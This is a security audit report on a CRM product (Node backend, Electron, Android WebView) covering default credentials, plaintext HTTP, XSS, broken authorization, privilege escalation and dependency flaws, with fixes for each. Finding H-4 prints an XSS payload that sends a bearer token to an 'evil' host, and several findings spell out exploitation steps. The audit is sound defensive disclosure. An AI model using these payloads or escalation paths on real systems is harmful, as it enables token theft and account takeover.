# Security Audit — CallTrack CRM (calltrack-crm v1.2.0)

> Date: 2026-06-17 · Scope: full-stack (Node/Express backend, React SPA, Electron
> desktop wrapper, Capacitor Android app, Baileys WhatsApp, Google Drive backups,
> Sarvam/Ollama AI). Each finding was validated by multiple independent adversarial
> verifiers reading the actual source; only findings passing the majority are
> reported as *confirmed*. Every location is `file:line` verified against source.

---

## Executive Summary

**Overall risk posture: HIGH.**

CallTrack's security rests almost entirely on one load-bearing assumption — *"the LAN
is a trust boundary"* — and that assumption does not hold. A LAN is not an
authenticated trust boundary: WPA2-PSK gives no client isolation, ARP spoofing works
on switched networks, and the product is explicitly built for shared office WiFi with
BYOD phones. Several of the worst issues (XSS, the Electron shell sink, broken
access-control, outdated runtimes) are *transport-independent* and network locality
does not mitigate them at all.

Highest-impact confirmed issues:

- **Default admin `admin`/`admin123`**, never force-rotated, on a login endpoint with
  **no rate-limit/lockout**, on a `0.0.0.0`-bound server → one-request takeover.
- **All traffic is plaintext HTTP** — session cookies (`secure:false`), passwords, and
  **non-expiring device bearer tokens** are passively sniffable and replayable.
- **Broken object-level authorization**: `agent`/`employee` roles see *every* lead,
  deal, and AI suggestion because scoping checks `role === 'caller'` literally.
- **Manager → owner privilege escalation** via `/api/devices/pairing-code`.
- **Stored DOM-XSS in the mobile WebView** → bearer-token theft, agent→admin escalation.
- **Renderer-controlled `shell.openExternal`** (Electron) → native file/protocol exec.
- **Unpatchable supply chain**: Electron 36 (18 Chromium advisories) + abandoned `xlsx`.

**Single highest-leverage fix: terminate TLS even on LAN and force-rotate the default
admin credential.** Together they close most of the critical exposure.

### "LAN-only" model — where it holds / fails

- **Holds:** bounds the attacker pool to network-adjacent actors; rules out
  internet-scale opportunistic attacks against a default install.
- **Fails (confirmed):** malicious LAN/guest peer, hostile or shared WiFi (passive
  sniff + ARP MITM), compromised paired phone, insider/low-priv escalation, and any
  drift beyond the LAN (VPN, mesh, a "temporary" port-forward).

### Severity tally (confirmed, post-merge)

| Severity | Count |
|---|---|
| Critical | 0 |
| High | 8 |
| Medium | 9 |
| Low | 8 |
| Info | 2 |

---

## HIGH

### H-1 — Default admin credentials (`admin`/`admin123`), never rotated, unthrottled login
`server/bootstrap.js:11-16` · login `server/routes/auth.js:52-77` · bind `server/app.js:204`

First run unconditionally creates a full owner-tier account with public static creds and
only logs a "change it" nudge. No `must_change_password` flag, no forced first-login
rotation, nothing refuses to boot with the default hash. Login has no lockout/throttle
(the `pairRateLimited` limiter exists but is wired only to `/pair`). A LAN peer POSTs
`{username:'admin',password:'admin123'}` and gets a 30-day owner session — total takeover.

**Fix:** generate a random admin password at first boot (print once) or require a setup
wizard; add a `must_change_password` flag enforced until cleared; refuse to start on the
default hash.

### H-2 — Login endpoint: no rate-limit, lockout, or backoff (online brute force)
`server/routes/auth.js:52-77`

`POST /api/auth/login` only logs `LOGIN_FAILED` on failure — no per-IP/per-username
counter, delay, lockout, or CAPTCHA. Password policy is just `length < 6`; bcrypt cost 10.
Parallel connections allow sustained guessing against weak passwords. `req.ip` is the
non-spoofable socket peer (no `trust proxy`), so it's a safe limiter key.

**Fix:** per-username + per-IP throttling with exponential backoff/lockout (reuse the
`pairRateLimited` pattern); raise min password length; add a constant failure delay.

### H-3 — All traffic over plaintext HTTP: cookies & long-lived tokens exposed on the wire
`server/app.js:104-111,204` · `capacitor.config.json` · `mobile/.../network_security_config.xml:9` · `AndroidManifest.xml:30`

No TLS anywhere. Session cookie is `secure:false`, 30-day `maxAge`. Mobile forces cleartext
(`cleartextTrafficPermitted=true`, no pinning; `usesCleartextTraffic=true`; Capacitor
`cleartext:true`/`androidScheme:http`). Every sync request carries the bearer token in clear
(`SyncEngine.kt:278,297`); the audio player puts it in the URL (`mobile/www/app.js:314`). The
device token never expires (`device_tokens` has only `revoked_at`) and isn't bound to a
client (`android_id` stored, never checked) — one passive capture = persistent full-API access.

**Fix:** terminate TLS even on LAN (mkcert/locally-trusted CA or HTTPS reverse proxy), then
`secure:true`, disable Capacitor cleartext, scope/remove the broad Android cleartext base-config;
add token expiry/rotation + bind to `android_id`; shorten the cookie window.

### H-4 — Stored DOM-XSS in mobile WebView → bearer-token theft, agent→admin escalation
`mobile/www/app.js:272-286,297-321 (c.name @312),403-411 (lead_name @406)` · sources `server/routes/leads.js:105`, `server/routes/tasks.js:114`

The Capacitor app builds UI by assigning template strings to `innerHTML` and interpolates
server-supplied, user-controlled fields **without escaping**. `escapeHtml()` exists and is
applied only to the WhatsApp message path — the rest (`queueRow` name/reason/title/lead_name/
product_name, `renderReview` `c.name`, the WhatsApp contacts `lead_name` badge) is raw. No CSP.
An agent sets a lead name to `<img src=x onerror="fetch('http://evil/'+cfg.token)">`; when the
assigned phone opens Today/Review the script runs in the WebView where the long-lived bearer
token lives as `cfg.token`. Lead names also render in the **admin-only** WhatsApp `/contacts`
badge → agent-planted name fires XSS in the admin's WebView. An external party can seed a name
via WhatsApp `pushName`.

**Fix:** escape every interpolated value with `escapeHtml()` (or stop using `innerHTML` template
strings); add a strict CSP to `mobile/www`; sanitize names server-side as defense in depth.

### H-5 — Renderer-controlled `shell.openExternal` with no scheme allow-list (Electron)
`desktop/main.js:61-64` (window-open) + `desktop/main.js:65-73` (will-navigate)

Both handlers hand any renderer-supplied URL straight to the OS shell with no scheme check, so
`file://`, `smb://`/UNC, and registered custom protocols (`ms-msdt:`) execute. Two reachable
paths: (1) MITM injection into the cleartext join-mode page; (2) authenticated low-priv, one
click — `client/src/pages/MeetingDetail.jsx:75` renders user-controlled `meeting.meeting_url` as
a link and the server stores it as a raw string, so any agent can set `meeting_url = smb://...`.
Impact: SMB/UNC NTLM-credential theft (Windows), file/custom-protocol launch. (macOS `file://`
impact is bounded; `smb:`/`ms-msdt:` are Windows-specific.)

**Fix:** validate the scheme in both handlers (allow only `http(s)`/`tel:`/`mailto:`/`wa.me`);
reject non-`http(s)` `meeting_url` server-side; add a CSP; move join mode to authenticated TLS.

### H-6 — Outdated / unpatchable shipped runtimes (Electron 36 Chromium; client `xlsx` 0.18.5)
`package.json` (`electron ^36.9.5`) · `client/package.json` (`xlsx ^0.18.5`) + `client/src/pages/ImportPage.jsx:47-48`

`npm audit` flags Electron `<=39.8.4` with 18 advisories (several HIGH UAFs + commandLineSwitches
injection); fix is a major bump. `xlsx ^0.18.5` is the abandoned npm-registry build with two HIGH
advisories (`fixAvailable:false`): prototype pollution + ReDoS, patched only on SheetJS's CDN. The
parser runs on attacker-controlled bytes (`XLSX.read`) client-side. The Electron renderer is
otherwise hardened (`contextIsolation:true`, `nodeIntegration:false`); the realistic vector is the
MITM join channel + missing explicit `sandbox:true`. The `/import` route is admin/manager-gated.

**Fix:** bump Electron to a supported major (42.x+), set `sandbox:true`, re-test `electron-rebuild`;
replace npm `xlsx` with the maintained SheetJS CDN build or `exceljs`; until then parse imports in a
sandboxed worker.

### H-7 — Broken object-level authorization: fail-OPEN `role === 'caller'` scoping leaks all data
`server/routes/leads.js:29` · `server/routes/deals.js:208-209` · `server/routes/ai.js:32`

List/scope filters gate visibility with the **literal** `req.user.role === 'caller'` instead of the
role helpers. `permissions.js` defines seven roles; `caller`, `agent`, and `employee` are all
non-admin "see only own" tiers (`canSeeAllLeads` = `isAdmin` = super_admin|admin|manager). Only
`caller` triggers the `assigned_to = ?` clause — so an `agent`/`employee`/`read_only` user falls
through to the **unscoped** branch:

- `leads.js:29` — `GET /api/leads` returns **every lead** (name, phone, email, city, notes, score).
- `deals.js:208` — `GET /api/collections` returns **all deals, balances, customer phones**.
- `ai.js:32` — `GET /api/ai/suggestions` returns **all pending AI suggestions across all leads**.

This is a reachable IDOR (OWASP A01) for a deliberately low-privilege account, independent of
transport. The per-lead `canAccessLead` middleware is correct; the list endpoints diverge from it.

**Fix:** replace the literal `=== 'caller'` checks with `permissions.js` semantics — scope whenever
`!canSeeAllLeads(role)` (and treat `read_only` per its intended scope).

### H-8 — Privilege escalation: a manager can pair their phone to a super_admin/admin account
`server/routes/devices.js:9,37-47` (mounted `app.js:163`) · token issued `server/routes/auth.js:26-50`

`devices.js` mounts only `requireAdmin` (which **includes `manager`**). `POST /api/devices/pairing-code`
accepts an arbitrary `user_id` and mints a pairing code for any active user, with no owner-tier check.
The code carries `pc.user_id`; pairing then issues a long-lived bearer token bound to that target user.
So a manager requests a code for a `super_admin`, pairs their own phone, and holds a non-expiring
owner-tier token — bypassing every `requireOwner` gate. This is the exact escalation `users.js:39-41,
69-71,87-89` was hardened against; `devices.js` has the same primitive with none of the guarding.

**Fix:** in `/pairing-code`, reject when `isOwner(targetUser.role) && !isOwner(req.user.role)`, mirroring
`users.js`. Consider restricting device pairing to owners outright.

---

## MEDIUM

- **M-1 — Paired-device bearer tokens never expire.** `server/migrations/002_mobile_sync.sql:7-16`;
  enforced `server/middleware/auth.js:18-30`. No `expires_at`, no `android_id` check → permanent
  full-identity credential until manual revoke. *Fix:* add `expires_at` + rotation + device binding.
- **M-2 — Bearer token accepted as `?token=` query param.** `server/middleware/auth.js:15-16`; used
  `mobile/www/app.js:314`. Credentials in URLs persist in WebView history, leak via `Referer`, and land
  in any proxy logs. *Fix:* stream media via `Authorization` header (fetch+blob) or short-lived signed
  media tickets; `Referrer-Policy: no-referrer`.
- **M-3 — Path traversal in cloud restore.** `scripts/restore-cloud.js:84-86,138-143,155-157`. Drive
  object names decode to on-disk paths with no confinement (`__`→`/`, no `..` guard) → arbitrary file
  write outside `--out` at DR time (attacker-controlled contents also need the passphrase; opaque-cipher
  temp-write escape is a clobber/DoS). *Fix:* `path.resolve` + `startsWith(base+sep)` confinement;
  basename-sanitize temp names; reject `..`/absolute decoded paths.
- **M-4 — Sarvam API key stored plaintext in `settings`.** `server/routes/settings.js:33-35`; read
  `server/routes/ai.js:115`. Inconsistent with the OAuth secrets (which are `sealSecret()`-sealed); the
  local backup job VACUUMs unencrypted snapshots containing the key. *Fix:* seal it like the OAuth secrets.
- **M-5 — Backup passphrase floor of 8 chars, no entropy check; cheap scrypt.** `server/routes/backup.js:137-141`;
  KDF `server/lib/cryptoBackup.js:23,80` (`N=16384`). Sole protection for all off-site backups; offline
  dictionary attack on captured Drive ciphertext or stored salt+verifier. *Fix:* 12+ chars, reject weak
  passphrases, raise scrypt cost (N≥2¹⁷) or Argon2id.
- **M-6 — Money fields accept unbounded values → paise overflow past `MAX_SAFE_INTEGER`.**
  `server/routes/deals.js:12,53-54,122-128`; `server/routes/invoices.js:120,126,129`. `toPaise` only checks
  `>0`/finite; `1e15` rupees → precision-lost paise that poisons `SUM()` rollups. *Fix:* clamp inputs and
  assert `Number.isSafeInteger(paise)` after conversion.
- **M-7 — CSV report export: spreadsheet formula injection.** `server/routes/reports.js:23-30`. Escaper
  only quotes comma/quote/newline, never neutralizes leading `= + - @`. Reachable via lead `source` (any
  caller writes it verbatim) → admin exports `GET /api/reports/sources?format=csv` and opens in Excel.
  *Fix:* prefix any cell starting with `= + - @ \t \r` per OWASP CSV-injection guidance.
- **M-8 — App requests `MANAGE_EXTERNAL_STORAGE` (All-Files Access).** `AndroidManifest.xml:12`; used
  `CallSyncPlugin.kt:66-77`, `SyncEngine.kt:149-151`. Far broader than needed — SAF tree picker +
  `READ_MEDIA_AUDIO` already implemented; widens blast radius and breaks Play policy. *Fix:* drop it.
- **M-9 — Build-tooling supply chain: `node-tar` HIGH path-traversal advisories.** `package.json`
  devDeps (`electron-builder ^25.1.8`, `@capacitor/cli ^6.2.1`). Build-host only (not runtime-reachable);
  poisoned/MITM'd prebuild tarball → traversal on extract. *Fix:* bump `electron-builder` 26.x +
  `@capacitor/cli` 8.x; pin/verify prebuild integrity; build on trusted networks.

---

## LOW / INFO

- **L-1 — Recording audio streamed via `?token=`.** `server/middleware/auth.js:14-17`; route
  `server/routes/review.js:258-271`. Media-route instance of M-2 (token in URL over plaintext HTTP).
- **L-2 — Tasks linkable to arbitrary projects (no project-access check).** `server/routes/tasks.js:132-137,182-185`.
  `project_id` validated only for existence → non-admin attaches tasks to any project, skews metrics, leaks
  project name. *Fix:* run `canAccessProject` for non-admins on create/update.
- **L-3 — `secret.key` 0o600 set only on creation, never re-asserted on read.** `server/lib/secretBox.js:14-26`,
  `server/app.js:72`; same gap for the WhatsApp auth dir (`whatsapp.js:418`). *Fix:* stat+chmod back to 0o600
  on startup.
- **L-4 — Session cookie `Secure` disabled / plaintext exposure.** `server/app.js:104-111,204`. Narrower
  restatement of H-3 (kept for traceability).
- **L-5 — Desktop/Windows installers unsigned / ad-hoc signed.** `scripts/afterpack-sign.cjs:21-26`;
  `package.json:79-93`. macOS ad-hoc only (no Developer ID/notarization), Windows unsigned, no signed
  auto-update. (Installers ship over HTTPS from GitHub releases, so vector is a compromised release/maintainer
  host.) *Fix:* sign+notarize macOS, Authenticode-sign Windows, publish out-of-band checksums.
- **L-6 — Device token in plaintext SharedPreferences with `allowBackup=true`.** `SyncEngine.kt:58,67-73`;
  `AndroidManifest.xml:24`. Cloud Auto-Backup / device transfer copy the cleartext token off-device. *Fix:*
  `allowBackup=false` (or exclude via `dataExtractionRules`); Keystore-backed `EncryptedSharedPreferences`.
- **L-7 — Failed-login audit stores the raw attempted username.** `server/routes/auth.js:59-66`. Combined
  with no login rate-limit and no `audit_logs` retention → unbounded growth + cleartext mistyped passwords.
  *Fix:* cap username length, bound retention, hash/truncate the stored value.
- **L-8 — Unauthenticated `/api/health` leaks disk-free space.** `server/app.js:114-122`. Minor recon. *Fix:*
  drop `disk_free_gb` from the public payload.
- **Info — Prompt injection into the local Ollama prompt.** `server/lib/ai.js:56-76,147-162,232`. Transcript +
  `leadName` interpolated without fencing, but tightly bounded (`format:'json'`, whitelisted/clamped fields,
  human-accept gate, local model — no SSRF/exec). *Fix:* role-separate transcript/name; keep output whitelisting.
- **Info — Lead import: ≤20k rows in one synchronous transaction from a 10MB body.** `server/routes/imports.js:13-111`.
  Admin-only; transient event-loop stall. *Fix:* chunk inserts, lower import body limit, rate-limit imports.

---

## Disputed / Not Confirmed (investigated, judged false-positive or low-confidence)

- **CORS reflects any `localhost` origin on `/api`** (`app.js:83-93`) — no `Allow-Credentials`, `sameSite=lax`,
  no browser-readable token; no reachable cross-origin read. Harmless over-broad config.
- **SQL injection sweep** — confirmed CLEAN. Every dynamic-SQL site uses whitelisted identifiers or bound
  placeholders; no request value reaches a SQL identifier position.
- **`role === 'admin'` literal *grant* checks** (`leads.js:94,114,223`, `today.js:16`) — fail-CLOSED
  (super_admin/manager get *less* access). Correctness/defense-in-depth only. **NB:** this is the opposite of
  the fail-OPEN `=== 'caller'` *restriction* checks, which ARE a real vuln — see H-7.
- **APK download endpoint public** (`app.js:135-139`) — intentional (unpaired phones install it); fixed path,
  client binary, metadata-only `version.json`. No traversal, no secret exposure.
- **secretBox key shares `secret.key` with session signing** (`secretBox.js:14-27`) — both files + ciphertext
  live in `DATA_DIR`; reading one reads all. Defense-in-depth (HKDF distinct labels), not reachable.
- **Drive search `q` string-interpolation** (`googleDrive.js:88-96,139-145`) — all call sites pass
  server-controlled constants. Harden escaper before any input becomes user-influenced.
- **Main BrowserWindow no explicit `sandbox`** (`main.js:48-57`) — Electron 36 sandboxes by default; no
  preload/IPC bridge on the remote-loading window. Set `sandbox:true` as defense-in-depth (folded into H-6).
- **FileProvider `path="."` exposes external root** (`file_paths.xml:3-4`) — provider `exported=false` and no
  code calls `getUriForFile`; dead boilerplate. Scope as hygiene.
- **`form-data 4.0.5` CRLF injection / `libsignal` git+ssh dep** — loaded but never invoked with
  attacker-influenced inputs; commit is full-SHA pinned. Hygiene overrides only.
- **`/pair` code guessing / rate-limit bypass** (`auth.js:12-50`) — 32⁶≈1.07e9 single-use CSPRNG codes,
  15-min expiry, non-spoofable `req.ip` key. Brute force infeasible; unpruned Map is a minor hygiene nit.
- **`recordingsRouter` NULL `file_path` sendFile** (`review.js:270`) — correctness bug (500 vs 410), not a
  security issue (server-generated whitelisted path).
- **`weekly.html` / dashboard HTML** (`dashboard.js:375-436`) — escapes `full_name`/company via `escapeHtml()`.
  Clean.
- **Command injection (AI/Sarvam)** — `execFile` with argument arrays (no shell), server-generated paths. Clean.
- **OAuth/Drive CSRF, session fixation, prototype pollution** — Drive callback validates a session-bound
  single-use `state`; login regenerates the session; `setSetting` writes a fixed column with no `__proto__`
  sink. Clean.

---

## Systemic Themes & Prioritized Recommendations

1. **Transport security (biggest gap).** Plaintext HTTP + `secure:false` + tokens-in-URL is a stack of
   mutually-reinforcing weaknesses (H-3, M-2, L-1, L-4; enables H-5's MITM path). Terminate TLS even on LAN,
   flip `secure:true`, disable Capacitor cleartext, remove the broad Android cleartext base-config.
2. **Credential lifecycle.** Force first-boot/first-login credential setup (H-1); add token `expires_at` +
   rotation + `android_id` binding (M-1, L-6); surface device `last_seen_at` with bulk revoke.
3. **Access control.** Fix the fail-open `=== 'caller'` scoping with the `permissions.js` helpers (H-7) and the
   manager→owner pairing escalation (H-8); add a project-access check on tasks (L-2). Audit every literal-role
   string for fail-open vs fail-closed direction.
4. **Anti-automation.** Extend the existing rate-limit pattern from `/pair` to `/login` (H-2); bound
   `audit_logs` retention (L-7); rate-limit imports.
5. **Output encoding / injection discipline.** Consistent `escapeHtml()`/CSP in the WebView (H-4) and OWASP CSV
   cell-prefixing in exports (M-7). Treat AI/transcript output as data.
6. **Secrets at rest.** Seal the Sarvam key (M-4); strengthen backup passphrase policy + KDF (M-5); re-assert
   `secret.key`/WhatsApp-auth permissions on startup (L-3).
7. **Dependency & supply-chain hygiene.** Bump Electron + set `sandbox:true` (H-6); replace abandoned `xlsx`
   (H-6); bump build tooling off vulnerable `node-tar` (M-9); sign/notarize installers (L-5). Add CI running
   `npm ci` + `npm audit` + `--ignore-scripts` allowlist.
8. **CSRF strategy (adequate by accident — keep it that way).** `sameSite=lax` + JSON-only body parser + no
   state-mutating GETs is currently safe. Do **not** add GET mutations or `urlencoded`/`text` parsers without
   re-evaluating. Add `X-Frame-Options: DENY`, CSP `frame-ancestors 'none'`, `X-Content-Type-Options: nosniff`.
9. **Path-confinement defaults.** Adopt a single `resolve + startsWith(base+sep)` helper for any path built from
   external names (M-3).
10. **Android least privilege.** Drop `MANAGE_EXTERNAL_STORAGE` (M-8) and `allowBackup` for the token store (L-6).
